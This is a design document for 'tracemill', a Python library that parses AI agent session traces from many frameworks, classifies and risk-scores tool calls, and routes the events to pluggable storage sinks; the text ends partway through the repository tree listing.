# tracemill

*Agent event observation pipeline with pluggable storage backends.*

Mills raw agent traces into structured, classified, risk-scored output.

---

## §1 — What It Is

A standalone Python library that **observes AI agent sessions** across any framework and routes structured events to pluggable storage backends. It is the observation-to-storage pipeline — the plumbing layer between "agent did something" and "that knowledge lives somewhere useful."

tracemill is framework-agnostic. Adding support for a new agent framework requires only a YAML mapping file — no Python code. It ships with 15 bundled mappings covering the most common agent frameworks and supports arbitrary extensions via user-defined mappings.

The library handles the full data lifecycle:
1. **Sources** transport raw data from files, HTTP endpoints, SSE streams, SQLite databases, or replays
2. **Parsers** pre-process non-structured formats (markdown logs, chunked data) into structured dicts
3. **Adapters** parse raw input into a common `SessionEvent` type using declarative YAML mappings
4. **Enricher** adds metadata: tool pairing, duration computation, multi-dimensional classification, risk scoring, phase detection, visibility assignment
5. **Pipeline** routes enriched events to one or more storage sinks with error isolation
6. **Sinks** write to storage backends or call custom handlers

Known consumers:
- **CodePlane** routes events to SQLite + OTEL for its control plane UI
- **memrelay** routes events to Graphiti for persistent agent memory
- A hypothetical third project might route to PostgreSQL, Elasticsearch, Langfuse, or a custom analytics pipeline

### Extraction Lineage

tracemill was extracted from CodePlane as a standalone library. CodePlane's observation logic was tightly coupled to its UI; tracemill decouples the pipeline so any consumer can subscribe to agent events without importing CodePlane's domain concerns.

---

## §2 — Architecture

`
┌────────────────────────────────────────────────────────────────────────┐
│                         SOURCES (Transport)                             │
│                                                                        │
│  FileWatchSource  FilePollSource  HttpPollSource  SSESource             │
│  SqliteSource     ReplaySource                                         │
│                                                                        │
│  Each source: transport → async stream of RawRecord                    │
└──────────────────────────────────┬─────────────────────────────────────┘
                                   │ RawRecord (payload: str)
                                   ▼
┌────────────────────────────────────────────────────────────────────────┐
│                  PARSERS (Optional Pre-processing)                      │
│                                                                        │
│  CopilotPreParser (markdown + log lines → event dicts)                 │
│  AiderPreParser   (markdown → event dicts)                             │
│                                                                        │
│  For frameworks that don't emit JSONL natively                         │
└──────────────────────────────────┬─────────────────────────────────────┘
                                   │ dict (normalized event)
                                   ▼
┌────────────────────────────────────────────────────────────────────────┐
│                    ADAPTERS (Parsing → SessionEvent)                    │
│                                                                        │
│  MappedJsonAdapter (YAML-driven, 15 frameworks)                        │
│  OtelSpanAdapter   (MAF OTel spans → SessionEvent)                     │
│                                                                        │
│  Preprocessors normalize complex event shapes before YAML mapping      │
└──────────────────────────────────┬─────────────────────────────────────┘
                                   │ SessionEvent
                                   ▼
┌────────────────────────────────────────────────────────────────────────┐
│                      EVENT PIPELINE                                     │
│                                                                        │
│  ┌──────────────────────────────────────────────────────────────────┐  │
│  │                        ENRICHER                                   │  │
│  │                                                                   │  │
│  │  • Tool call pairing (start ↔ complete)                          │  │
│  │  • Duration computation                                           │  │
│  │  • Multi-dimensional classification (mechanism/effect/scope/      │  │
│  │    role/action/capability/structure)                               │  │
│  │  • Shell AST analysis (bash, PowerShell, cmd)                    │  │
│  │  • MCP profile matching                                           │  │
│  │  • Risk scoring (0-100 with MITRE ATT&CK mappings)               │  │
│  │  • Phase detection (planning/implementation/verification/         │  │
│  │    exploration/review)                                            │  │
│  │  • Visibility assignment (visible/system/collapsed)               │  │
│  └──────────────────────────────────────────────────────────────────┘  │
│                                                                        │
│  Error-isolated fan-out to all registered sinks                        │
└──────────────────────────────────┬─────────────────────────────────────┘
                                   │ Enriched SessionEvent
                                   ▼
┌────────────────────────────────────────────────────────────────────────┐
│                       STORAGE SINKS                                     │
│                                                                        │
│  CallbackSink (user-provided async functions)                          │
│  ⬜ SqliteSink     ⬜ JsonlSink     ⬜ S3Sink     ⬜ OtelSink          │
│                                                                        │
│  Sinks implement: on_event(), on_span(), on_usage(), flush(), close()  │
└────────────────────────────────────────────────────────────────────────┘
`

### Data Flow Summary

`
Observation: Source → [Parser] → Adapter → Enricher → Pipeline → Sink(s)
Gate:        Hook Payload → Adapter.parse_one() → Enricher.classify() → PolicyEngine → Verdict
                                    ↑ same classify/ rules ↑
`

The observation pipeline supports three record types flowing through sinks:
- `SessionEvent` — the primary event type (all enrichment applies here)
- `TelemetrySpan` — derived span data (start/end pairs)
- `UsageRecord` — LLM token/cost accounting

The gate path (§22) shares `classify/` and `mappings/` with the observation pipeline but operates synchronously on single events, returning a verdict instead of writing to sinks.

---

## §3 — Core Types

All domain objects inherit from `FrozenModel` (immutable Pydantic model). All configuration/schema objects inherit from `StrictModel` (rejects unknown fields).

### Base Models (`models.py`)

`python
class StrictModel(BaseModel):
    model_config = ConfigDict(extra="forbid")

class FrozenModel(BaseModel):
    model_config = ConfigDict(frozen=True)
`

### EventKind (`types.py`)

An **open string registry** class with 75+ `Final` constants. Grammar:

`
<domain>[.<object>].<phase>
`

Any string is a valid `kind` value (forward-compatible), but canonical kinds are defined as constants for autocomplete, documentation, and filtering.

**Domains:** session, turn, message, tool, llm, planning, reasoning, agent, file, command, mcp, hook, permission, input, checkpoint, memory, knowledge, browser, guardrail, skill, workflow, task, telemetry

**Phases:** started, completed, failed, chunk, progress, requested, received, granted, denied, created, restored, skipped

`python
class EventKind:
    SESSION_STARTED: Final = "session.started"
    TOOL_CALL_STARTED: Final = "tool.call.started"
    TOOL_CALL_COMPLETED: Final = "tool.call.completed"
    LLM_CALL_STARTED: Final = "llm.call.started"
    # ... 75+ constants total
    RAW: Final = "raw"  # catch-all for unmapped events

KNOWN_KINDS: frozenset[str]  # all canonical kinds for validation/filtering
`

### IngestionMode

`python
IngestionMode = Literal["stream", "file_watch", "poll", "replay", "sqlite"]
`

### EventMetadata

`python
class EventMetadata(FrozenModel):
    # Source provenance
    source_framework: str | None        # "copilot", "claude", "aider", etc.
    ingestion_mode: IngestionMode | None
    raw_kind: str | None                # original framework-specific event type

    # Correlation
    span_id: str | None
    parent_id: str | None
    correlation_id: str | None
    run_id: str | None

    # Ordering
    sequence: int | None
    namespace: tuple[str, ...] | None   # scope path (subgraph, subagent)
    partial: bool = False               # True for streaming chunks

    # Enrichment (set by Enricher)
    repo: str | None
    turn_id: str | None
    visibility: Visibility = Visibility.VISIBLE
    phases: frozenset[Phase] | None
    classification: Classification | None
    tool_display: str | None
    tool_intent: str | None
    duration_ms: float | None
`

### SessionEvent

`python
class SessionEvent(FrozenModel):
    id: str                              # UUID4, auto-generated
    kind: str                            # open string (use EventKind constants)
    session_id: str
    timestamp: datetime
    payload: dict[str, Any]
    raw_event: dict[str, Any] | None     # original event data, verbatim
    metadata: EventMetadata
`

### TelemetrySpan

`python
class TelemetrySpan(FrozenModel):
    name: str
    session_id: str
    start_time: datetime
    end_time: datetime
    attributes: dict[str, Any]
`

### UsageRecord

`python
class UsageRecord(FrozenModel):
    session_id: str
    timestamp: datetime
    model: str
    input_tokens: int       # >= 0
    output_tokens: int      # >= 0
    cost_usd: float | None  # >= 0
`

---

## §4 — Sources

The async transport layer. Each source implements the `Source` ABC: an async context manager that yields `RawRecord` objects via `__aiter__`.

### Source ABC (`sources/base.py`)

`python
@dataclass(slots=True)
class RawRecord:
    payload: str
    source_name: str
    mode: IngestionMode
    sequence: int | None = None
    received_at: datetime = field(default_factory=lambda: datetime.now(timezone.utc))

class Source(ABC):
    name: str
    async def __aenter__(self) -> "Source": ...
    async def __aexit__(self, ...): ...
    def __aiter__(self) -> AsyncIterator[RawRecord]: ...
`

### Implementations

| Source | Mode | Description |
|--------|------|-------------|
| `FileWatchSource` | `file_watch` | OS-native events via watchdog. Handles rotation, truncation, creation. |
| `FilePollSource` | `poll` | Fixed-interval polling. For network mounts where inotify is unavailable. |
| `HttpPollSource` | `poll` | HTTP polling with ETag/Last-Modified conditional requests. Retry with exponential backoff. Cursor-based pagination. |
| `SSESource` | `stream` | WHATWG-compliant Server-Sent Events. Reconnect with backoff, Last-Event-ID. |
| `SqliteSource` | `sqlite` | Poll a SQLite table for new rows via monotonic cursor column. WAL mode for concurrent reads. |
| `ReplaySource` | `replay` | One-shot file read, line-by-line. For testing and batch reprocessing. |

All sources:
- Are single-consumer (no concurrent iteration)
- Detect file rotation/truncation where applicable
- Run I/O in background threads to avoid blocking the event loop
- Validate resources on `__aenter__`

---

## §5 — Adapters

Adapters parse raw bytes/strings into `SessionEvent` streams.

### Adapter ABC (`adapters/base.py`)

`python
class Adapter(ABC):
    def parse(self, raw: bytes | str) -> Iterator[SessionEvent]: ...

class JsonLineAdapter(Adapter):
    """Handles bytes→str, JSON parsing, dict validation."""
    def parse_dict(self, obj: dict[str, Any]) -> Iterator[SessionEvent]: ...
`

### MappedJsonAdapter (`adapters/mapped_json.py`)

The primary adapter — data-driven via YAML mappings. No custom Python code needed per framework.

`python
class MappedJsonAdapter(JsonLineAdapter):
    def __init__(self, mapping: FrameworkMapping, session_id: str): ...
    def parse_dict(self, obj: dict) -> Iterator[SessionEvent]: ...

    @classmethod
    def from_yaml(cls, yaml_path: str, session_id: str) -> "MappedJsonAdapter": ...
`

Features:
- Dot-path field extraction (`foo.bar.0.baz`)
- Literal values (`literal:some_value`)
- Timestamp heuristic parsing (ISO, unix seconds, milliseconds, nanoseconds)
- Preprocessor dispatch for non-flat event schemas
- Default kind for unmapped event types

### OtelSpanAdapter (`adapters/otel.py`)

For Microsoft 365 Agents SDK (MAF) which emits OTel spans instead of JSON lines.

`python
class OtelSpanAdapter(Adapter):
    def __init__(self, ingestion_mode: IngestionMode, session_id: str): ...
    def parse_span(self, span: dict[str, Any]) -> Iterator[SessionEvent]: ...
    def parse(self, raw: str) -> Iterator[SessionEvent]: ...
`

Features:
- Both snake_case and camelCase OTel JSON keys
- Duration computation from start/end nanoseconds
- Attribute extraction via YAML-configured rules (`maf.yaml`)
- Status code → error kind mapping

---

## §6 — YAML Mapping System

The declarative configuration format that drives `MappedJsonAdapter`.

### Schema (`FrameworkMapping`)

`yaml
framework: copilot               # framework identifier
framework_version: "1.x"        # format version this mapping targets
ingestion_mode: file_watch       # must be explicit
type_field: type                 # dot-path to event type discriminator
timestamp_field: timestamp       # dot-path to timestamp
default_kind: raw                # kind for unmapped event types
preprocessor: claude             # optional: registered preprocessor name

events:
  session.start:                 # raw event type value
    kind: session.started        # canonical EventKind
    payload:                     # field_name → dot-path extraction
      model: data.selectedModel
      cwd: data.context.cwd
`

### Bundled Mappings (15 files in `src/tracemill/mappings/`)

| File | Framework | Notes |
|------|-----------|-------|
| `copilot.yaml` | GitHub Copilot CLI | JSONL session events |
| `copilot_markdown.yaml` | Copilot CLI | For CopilotPreParser output |
| `claude.yaml` | Claude Code (Anthropic) | Uses `claude` preprocessor |
| `cline.yaml` | Cline (VS Code) | Uses `cline` preprocessor |
| `aider.yaml` | Aider | JSONL mode |
| `aider_markdown.yaml` | Aider | For AiderPreParser output |
| `crewai.yaml` | CrewAI | Multi-agent framework |
| `goose.yaml` | Goose (Block) | Uses `goose` preprocessor |
| `langgraph.yaml` | LangGraph | LangChain orchestration |
| `maf.yaml` | Microsoft 365 Agents SDK | OTel span mapping (used by OtelSpanAdapter) |
| `opencode.yaml` | OpenCode | CLI coding agent |
| `openhands.yaml` | OpenHands (All-Hands AI) | Uses `openhands` preprocessor |
| `pydantic_ai.yaml` | PydanticAI | Uses `pydantic_ai` preprocessor |
| `smolagents.yaml` | SmoLAgents (HuggingFace) | Uses `smolagents` preprocessor |
| `sweagent.yaml` | SWE-Agent (Princeton) | SWE-bench agent |

### Mapping Resolution (`config/mappings.py`)

Search order (first match wins):
1. User-specified dirs (from `config.mappings_dirs`)
2. `~/.tracemill/mappings/` (default user dir)
3. Bundled mappings (`src/tracemill/mappings/`)

User mappings override bundled ones with the same name.

---

## §7 — Preprocessors

Preprocessors normalize raw dicts into flat dicts suitable for type_field-based YAML mapping. They handle compound discriminators, nested structures, and field-presence-based typing.

### Registry Pattern (`preprocessors/registry.py`)

`python
PreprocessorFn = Callable[[dict[str, Any]], list[dict[str, Any]]]

@register_preprocessor("claude")
def preprocess_claude(obj: dict) -> list[dict]: ...
`

### Registered Preprocessors (6)

| Name | Module | Framework | Purpose |
|------|--------|-----------|---------|
| `claude` | `preprocessors/claude.py` | Claude Code | Normalizes nested content blocks |
| `cline` | `preprocessors/cline.py` | Cline | Handles VS Code extension format |
| `goose` | `preprocessors/goose.py` | Goose | Normalizes Block's event shape |
| `openhands` | `preprocessors/openhands.py` | OpenHands | Handles action/observation dicts |
| `pydantic_ai` | `preprocessors/pydantic_ai.py` | PydanticAI | Normalizes streaming parts |
| `smolagents` | `preprocessors/smolagents.py` | SmoLAgents | Handles HuggingFace format |

Each preprocessor:
- Takes a single raw dict
- Returns a list of flat dicts (one input may expand to multiple events)
- Is referenced by name in the YAML mapping's `preprocessor` field

---

## §8 — Parsers

Custom pre-parsers for frameworks that don't emit JSONL natively. These convert unstructured formats (markdown, log files) into structured event dicts that can then flow through `MappedJsonAdapter`.

### Base Class (`parsers/base.py`)

`python
class MarkdownPreParser(ABC):
    """Tree-sitter markdown AST parser with incremental support."""

    def parse_file(self, path: Path) -> Iterator[dict[str, Any]]: ...
    def parse_text(self, text: str) -> Iterator[dict[str, Any]]: ...
    def parse_chunk(self, chunk: str) -> Iterator[dict[str, Any]]: ...
    def flush(self) -> Iterator[dict[str, Any]]: ...
`

Features:
- Full-file and incremental (chunked) parsing modes
- Hold-back of final event until next chunk confirms structural closure
- Block extraction via tree-sitter queries
- Sorted-by-position processing

### CopilotPreParser (`parsers/copilot.py`)

Handles two Copilot CLI data sources:
1. **Markdown parsing** (`parse_turn`): Extracts tool calls and structured blocks from `session-store.db` assistant_response text
2. **Log line parsing** (`parse_log_line`): Extracts structured API events from `process-*.log` files

Emits events suitable for `copilot_markdown.yaml` mapping.

### AiderPreParser (`parsers/aider.py`)

Converts `.aider.chat.history.md` into structured event dicts:
- Session start detection from `# aider chat started at ...` headings
- User message / slash command extraction from `####` headings
- Tool output sub-classification (version, model, repo, usage, edits, commits, errors)
- SEARCH/REPLACE block extraction for file edits
- AI response content from paragraphs/setext headings

Emits events suitable for `aider_markdown.yaml` mapping.

---

## §9 — Enrichment

The `Enricher` (`enricher.py`) is a stateful per-session processor that sits inside the pipeline. It transforms raw events before they reach sinks.

The enricher produces **classifications and measurements only** — never verdicts, recommended actions, or decision-implying fields. It answers "what is this?" and "how risky is this?", not "what should be done about it?". Action semantics exist only in the gate module (§22) where they are actually executable.

### Enricher API

`python
class Enricher:
    def __init__(
        self,
        custom_classifications: dict[str, Classification] | None = None,
        config: ClassifyConfig | None = None,
        config_path: Path | str | None = None,
    ) -> None: ...

    def process(self, event: SessionEvent) -> SessionEvent | list[SessionEvent] | None: ...
    def flush(self) -> list[SessionEvent]: ...
`

### Enrichment Steps

1. **Tool call pairing**: Buffers `TOOL_CALL_STARTED` events, pairs them with matching `TOOL_CALL_COMPLETED` by `tool_call_id`. Merges payloads. Emits orphan starts on displacement or flush.

2. **Duration computation**: Calculates `metadata.duration_ms` from timestamp difference of start/complete pairs.

3. **Classification dispatch**: For `TOOL_CALL_STARTED` and unpaired `TOOL_CALL_COMPLETED`:
   - Shell tools → deep tree-sitter AST analysis (bash, PowerShell, cmd)
   - Native tools → static classification via engine lookup
   - MCP tools → profile-based classification
   - Scope refinement from file paths in payload

4. **Risk scoring**: Computes a 0-100 risk score:
   - Shell commands: structural + flag modifiers + injection patterns + pipeline taint + context
   - Native/MCP tools: intent base + scope + capability escalation + context

5. **Visibility assignment**: Sets `metadata.visibility` based on event kind (system events, bookkeeping → SYSTEM; similar repeated events → COLLAPSED).

6. **Phase detection**: Derives `metadata.phases` from classification dimensions.

### Return Semantics

- Returns `None` → event is buffered (waiting for pair)
- Returns `SessionEvent` → enriched event ready for sinks
- Returns `list[SessionEvent]` → displaced orphan + new buffer (rare)

---

## §10 — Classification Engine

A YAML-driven, multi-dimensional classification system for tool invocations. Located in the `classify/` package (14 modules + 9 data files).

### Dimensions (`classify/core.py`)

| Dimension | Question | Root Values |
|-----------|----------|-------------|
| `Mechanism` | What resource domain? | filesystem, process, network, database, delegation, communication, unknown |
| `Effect` | What state change? | read_only, mutating, destructive |
| `Scope` | What's being operated on? | artifact, state, data, configuration, knowledge, identity, message |
| `Role` | What archetype of tool? | validator, retriever, transformer, generator, modifier, executor, communicator, orchestrator, observer, persistence |
| `Action` | What verb? | validate, retrieve, transform, generate, execute, deliver, configure, analyze, persist, modify, remove |
| `Capability` | What permissions needed? | filesystem_read, filesystem_write, network_inbound, network_outbound, subprocess, uses_credentials, elevated_privilege, human_interaction |
| `Structure` | Composition pattern? | sequential, parallel, conditional, interactive |

### Coding Domain Extensions (`classify/coding.py`)

Dot-path subtypes that extend root dimensions for software engineering:

- `CodingMechanism`: process.shell, process.repl, process.debug, network.http, database.sql, delegation.agent, communication.user, etc.
- `CodingScope`: artifact.source_code, artifact.test_code, configuration.dependency, state.repository, etc.
- `CodingRole`: validator.linter, validator.test_runner, transformer.compiler, executor.script_runner, persistence.version_control, etc.
- `CodingAction`: validate.lint, validate.test, transform.compile, persist.commit, deliver.deploy, etc.
- `ShellDialect`: bash, powershell, cmd, zsh, fish, posix_sh
- `ShellStructure`: piped, redirected

### Classification Dataclass

`python
@dataclass(frozen=True)
class Classification:
    mechanism: str
    effect: str | None = None
    scope: frozenset[str] = frozenset()
    role: frozenset[str] = frozenset()
    action: frozenset[str] = frozenset()
    capability: frozenset[str] = frozenset()
    structure: frozenset[str] = frozenset()
    shell_dialect: str | None = None
    binaries: tuple[str, ...] = ()
    phase_map: tuple[PhaseSegment, ...] = ()
`

### Shell Classification (`classify/shell.py`, `classify/powershell.py`, `classify/cmd.py`)

Deep AST-based classification of shell commands:
- **Bash**: tree-sitter-bash parser. Handles compound commands, pipes, redirects, conditionals. Detects structural patterns.
- **PowerShell**: tree-sitter-powershell parser. Handles cmdlets and native commands.
- **cmd.exe**: Lightweight tokenization (no mature tree-sitter grammar). Splits on & and &&.

Shared infrastructure:
- Transparent wrapper unwrapping (env, sudo, nohup, etc.)
- Binary classification via rule tables
- Subcommand and flag analysis
- Activity detection (verification, delivery, setup, investigation, implementation)
- Per-command phase grouping into `phase_map`

### MCP Classification (`classify/mcp.py`)

Profile-based classification for MCP (Model Context Protocol) tools:

`python
@dataclass(frozen=True)
class McpServerProfile:
    namespace_aliases: tuple[str, ...]  # e.g., ("github", "gh")
    mechanism: str
    role: frozenset[str]
    default_effect: str | None
    scope: frozenset[str]
    action: frozenset[str]
    capability: frozenset[str]
    tool_overrides: dict[str, McpToolOverride]
`

Namespace extraction from `mcp__<server>__<tool>` naming convention.

### Risk Scoring (`classify/risk.py`)

Produces a 0-100 risk score with confidence level and MITRE ATT&CK technique mappings.

`python
@dataclass(frozen=True, slots=True)
class RiskAssessment:
    score: int        # 0-100
    level: str        # safe / caution / danger / critical
    confidence: str   # high / medium / low
    factors: tuple[str, ...]
    mitre: tuple[str, ...]
    version: str
`

Scoring layers:
1. **Structural**: Effect × scope (from Classification)
2. **Flag modifiers**: Per-binary flag rules (from `risk.yaml`)
3. **Injection patterns**: Regex-matched evasion/injection patterns (capped)
4. **Pipeline taint**: Source→sink flow escalation through pipe operators
5. **Context**: Project-relative path targeting adjustments

### ClassificationEngine (`classify/config.py`)

Immutable pre-built runtime indexes constructed once from config:

`python
class ClassificationEngine:
    canonical_tools: dict[str, str]
    tool_classifications: dict[str, Classification]
    verb_inference: dict[str, tuple[str, str]]
    shell_rules: tuple[Rule, ...]
    rules_by_binary: dict[str, tuple[Rule, ...]]
    binary_info: dict[str, BinaryInfo]
    mcp_profiles: tuple[McpServerProfile, ...]
    mcp_alias_index: dict[str, McpServerProfile]
    risk_config: dict[str, Any] | None
    # ... plus lookup tables for npm scripts, interpreter modules, git subcmds, etc.
`

### Classification Data Files (`classify/data/`)

| File | Content |
|------|---------|
| `canonical_tools.yaml` | Tool name aliases (many→one normalization) |
| `verb_inference.yaml` | Verb prefix → (effect, action) mappings |
| `binary_info.yaml` | Static metadata about known binaries (role, network, destructive) |
| `shell_defaults.yaml` | Activity→dimension default mappings |
| `shell_rules.yaml` | Declarative binary+subcmd+flag→classification rules |
| `effect_overrides.yaml` | Per-binary flag/subcmd effect override rules |
| `mcp_profiles.yaml` | MCP server classification profiles |
| `tool_classifications.yaml` | Full classifications for known native tools |
| `risk.yaml` | Risk scoring weights, flag modifiers, injection patterns, taint rules |

### Workflow Dimensions (`classify/workflow.py`)

Derived/presentation concerns separate from semantic classification:

`python
class Phase(StrEnum):
    PLANNING, IMPLEMENTATION, VERIFICATION, EXPLORATION, REVIEW

class Visibility(StrEnum):
    VISIBLE, SYSTEM, COLLAPSED
`

### Dimension Registry (`classify/registry.py`)

Validates and queries hierarchical dot-path classification values:

`python
class DimensionRegistry:
    def register_dimension(self, name: str, enum_cls: type[StrEnum]) -> None: ...
    def extend_dimension(self, name: str, enum_cls: type[StrEnum]) -> None: ...
    def validate(self, dimension: str, value: str) -> bool: ...
    def children_of(self, dimension: str, ancestor: str) -> frozenset[str]: ...
    def is_descendant_of(self, dimension: str, value: str, ancestor: str) -> bool: ...
`

---

## §11 — Pipeline

`EventPipeline` (`pipeline.py`) routes events, spans, and usage records to multiple storage sinks with error isolation.

`python
class EventPipeline:
    def __init__(self, sinks: list[StorageSink], enricher: Enricher | None = None) -> None: ...

    async def push(self, event: SessionEvent) -> None: ...
    async def push_span(self, span: TelemetrySpan) -> None: ...
    async def push_usage(self, usage: UsageRecord) -> None: ...
    async def flush(self) -> None: ...
    async def close(self) -> None: ...
`

### Behavior

- **Enrichment**: If an enricher is configured, events pass through `enricher.process()` before reaching sinks. Enricher failures fall through gracefully (raw event passed to sinks).
- **Error isolation**: Each sink call is wrapped in `asyncio.gather(return_exceptions=True)`. One failing sink does not block others.
- **Fan-out**: All sinks receive every event concurrently.
- **Flush**: Drains enricher buffer (unpaired tool starts), then flushes all sinks.
- **Close**: Flush + close all sinks (also error-isolated).

---

## §12 — Storage Sinks

Sinks are the output layer. Users select and configure sinks entirely via YAML -- no code required. The `StorageSink` ABC exists for internal implementation; end users never subclass it.

### StorageSink ABC (`sinks/base.py`)

`python
class StorageSink(ABC):
    @abstractmethod
    async def on_event(self, event: SessionEvent) -> None: ...
    async def on_span(self, span: TelemetrySpan) -> None: ...   # default no-op
    async def on_usage(self, usage: UsageRecord) -> None: ...   # default no-op
    async def flush(self) -> None: ...                          # default no-op
    async def close(self) -> None: ...                          # default no-op
`

### Implementations

| Sink | Status | Description |
|------|--------|-------------|
| `CallbackSink` | ✅ Done | Delegates to user-provided async callables. For SDK/library consumers that embed tracemill in Python. |
| `SqliteSink` | ⬜ Planned | Local SQLite storage with WAL mode, schema migration, batch inserts. Configured via `type: sqlite` in YAML. |
| `JsonlSink` | ⬜ Planned | Append-only JSONL files with optional size-based rotation. Configured via `type: jsonl` in YAML. |
| `S3Sink` | ⬜ Planned | Cloud object storage with buffered upload and key formatting. Configured via `type: s3` in YAML. |
| `OtelSink` | ⬜ Planned | Export spans to an OpenTelemetry collector. Configured via `type: otel` in YAML. |

### Configuration examples

`yaml
sinks:
  - type: sqlite
    path: ./events.db
  - type: jsonl
    path: ./output/events.jsonl
    rotate_mb: 100
  - type: s3
    bucket: my-traces
    prefix: agents/
    region: us-east-1
`

---

## §13 — Configuration

### Root Config (`config/models.py`)

`python
class TracemillConfig(StrictModel):
    log_level: Literal["DEBUG", "INFO", "WARNING", "ERROR", "CRITICAL"] = "INFO"
    mappings_dirs: list[Path] = []           # additional mapping search paths
    pipelines: list[PipelineConfig] = []     # named source→adapter→sinks pipelines
    sdk: SDKConfig = SDKConfig()             # in-process push mode settings

class SDKConfig(StrictModel):
    batch_size: int = 64
    flush_interval: float = 5.0
    max_queue_size: int = 10000
`

### PipelineConfig

`python
class PipelineConfig(StrictModel):
    name: str                    # unique pipeline identifier
    source: SourceConfig         # discriminated union
    adapter: AdapterConfig       # discriminated union
    sinks: list[SinkConfig]      # at least one sink required
`

### Discriminated Unions

**Sources** (discriminator: `type`):
`FileWatchSourceConfig`, `FilePollSourceConfig`, `HttpPollSourceConfig`, `SSESourceConfig`, `ReplaySourceConfig`

> Note: `SqliteSource` is implemented but not yet exposed in the config union. It is used programmatically (e.g., by CopilotPreParser) rather than instantiated from `tracemill.yaml`.

**Adapters** (discriminator: `type`):
`MappedJsonAdapterConfig`, `OtelSpanAdapterConfig`

**Sinks** (discriminator: `type`):
`SqliteSinkConfig`, `JsonlSinkConfig`, `S3SinkConfig`

### Loading Precedence (`config/loader.py`)

From highest to lowest priority:
1. Constructor kwargs passed to `load_config()`
2. Environment variables (`TRACEMILL_*` prefix, `__` for nesting)
3. `TRACEMILL_CONFIG` env var (explicit path override)
4. Project-local: `./tracemill.yaml`
5. User-global: `~/.tracemill/config.yaml`
6. Built-in defaults

### Bootstrap

On first config access, `~/.tracemill/` is auto-created with:
- `config.yaml` (default configuration template)
- `mappings/` (directory for user custom mappings)

No separate `tracemill init` command needed.

### Environment Variables

- `TRACEMILL_CONFIG` — explicit config file path
- `TRACEMILL_LOG_LEVEL` — scalar override
- `TRACEMILL_SDK__BATCH_SIZE` — nested override (double underscore = nesting)

---

## §14 — Telemetry / OTEL

🚧 **Stub** — the `telemetry/` package exists with an empty `__init__.py`.

**Planned:**
- OpenTelemetry instrumentation (counters, histograms)
- `OtelSink` that exports spans to a collector
- Automatic span generation from tool call pairs
- Pipeline-level metrics (events/sec, enrichment latency, sink write time)

---

## §15 — EventBus

⬜ **Planned** — not yet implemented or stubbed.

An optional pub/sub mechanism for in-process consumers that want to react to events without implementing a full sink. Lower-commitment than a sink: no flush/close lifecycle, no persistence contract.

---

## §16 — Formatting

🚧 **Stub** — the `formatting/` package exists with an empty `__init__.py`.

**Planned:**
- Human-readable event formatting for terminal/log display
- Compact and verbose output modes
- Color and structured output for debugging

---

## §17 — CI / CD

### Workflows (`.github/workflows/`)

| Workflow | Trigger | Purpose |
|----------|---------|---------|
| `ci-lint.yml` | Push / PR | `ruff check` + `ruff format --check` |
| `ci-test.yml` | Push / PR | `pytest` with Python 3.11, 3.12, 3.13 matrix |
| `publish.yml` | Release tag | Build + publish to PyPI |
| `tool-surface-audit.yml` | Weekly | Audit tool classification coverage |
| `weekly-compat-audit.yml` | Weekly | Compatibility checks against framework updates |

### Branch Protection

- Required: `ci-lint` and `ci-test` pass on all matrix versions
- Copilot agent setup: `copilot-setup-steps.yml`

---

## §18 — Repository Structure

`
tracemill/
├── .github/
│   ├── copilot-setup-steps.yml
│   └── workflows/
│       ├── ci-lint.yml
│       ├── ci-test.yml
│       ├── publish.yml
│       ├── tool-surface-audit.yml
│       └── weekly-compat-audit.yml
├── src/tracemill/
│   ├── __init__.py              # Public API surface
│   ├── models.py                # StrictModel, FrozenModel bases
│   ├── types.py                 # EventKind, SessionEvent, EventMetadata, etc.
│   ├── pipeline.py              # EventPipeline fan-out
│   ├── enricher.py              # Stateful enrichment (pairing, classification, risk)
│   ├── adapters/
│   │   ├── __init__.py
│   │   ├── base.py              # Adapter, JsonLineAdapter ABCs
│   │   ├── mapped_json.py       # MappedJsonAdapter (YAML-driven)
│   │   └── otel.py              # OtelSpanAdapter (MAF spans)
│   ├── sources/
│   │   ├── __init__.py
│   │   ├── base.py              # Source ABC, RawRecord
│   │   ├── file_watch.py        # FileWatchSource (watchdog)
│   │   ├── file_poll.py         # FilePollSource (interval)
│   │   ├── http_poll.py         # HttpPollSource (ETag/conditional)
│   │   ├── sse.py               # SSESource (WHATWG spec)
│   │   ├── sqlite.py            # SqliteSource (row polling)
│   │   └── replay.py            # ReplaySource (one-shot)
│   ├── sinks/
│   │   ├── __init__.py
│   │   ├── base.py              # StorageSink ABC
│   │   └── callback.py          # CallbackSink
│   ├── parsers/
│   │   ├── __init__.py
│   │   ├── base.py              # MarkdownPreParser ABC
│   │   ├── copilot.py           # CopilotPreParser
│   │   └── aider.py             # AiderPreParser
│   ├── preprocessors/
│   │   ├── __init__.py          # Registry + all imports
│   │   ├── registry.py          # register/get_preprocessor
│   │   ├── claude.py
│   │   ├── cline.py
│   │   ├── goose.py
│   │   ├── openhands.py
│   │   ├── pydantic_ai.py
│   │   └── smolagents.py
│   ├── classify/
│   │   ├── __init__.py          # Public API re-exports
│   │   ├── core.py              # Mechanism, Effect, Scope, Role, Action, etc.
│   │   ├── coding.py            # CodingMechanism, CodingScope, CodingRole, etc.
│   │   ├── config.py            # ClassifyConfig, ClassificationEngine, loader
│   │   ├── workflow.py          # Phase, Visibility
│   │   ├── shell.py             # Bash shell classifier (tree-sitter)
│   │   ├── powershell.py        # PowerShell classifier (tree-sitter)
│   │   ├── cmd.py               # cmd.exe classifier (tokenization)
│   │   ├── tools.py             # Native tool classification
│   │   ├── mcp.py               # MCP profile-based classification
│   │   ├── rules.py             # Declarative rule matching, ShellActivity
│   │   ├── risk.py              # Risk scoring (0-100, MITRE mappings)
│   │   ├── phases.py            # Phase derivation logic
│   │   ├── registry.py          # DimensionRegistry
│   │   └── data/                # YAML config files (9 files)
│   │       ├── binary_info.yaml
│   │       ├── canonical_tools.yaml
│   │       ├── effect_overrides.yaml
│   │       ├── mcp_profiles.yaml
│   │       ├── risk.yaml
│   │       ├── shell_defaults.yaml
│   │       ├── shell_rules.yaml
│   │       ├── tool_classifications.yaml
│   │       └── verb_inference.yaml
│   ├── config/
│   │   ├── __init__.py
│   │   ├── models.py            # TracemillConfig, PipelineConfig, unions
│   │   ├── loader.py            # Hierarchical config loading
│   │   ├── defaults.py          # Default config template
│   │   └── mappings.py          # Mapping file resolver
│   ├── mappings/                # Bundled YAML mappings (15 files)
│   │   ├── __init__.py
│   │   ├── aider.yaml
│   │   ├── aider_markdown.yaml
│   │   ├── claude.yaml
│   │   ├── cline.yaml
│   │   ├── copilot.yaml
│   │   ├── copilot_markdown.yaml
│   │   ├── crewai.yaml
│   │   ├── goose.yaml
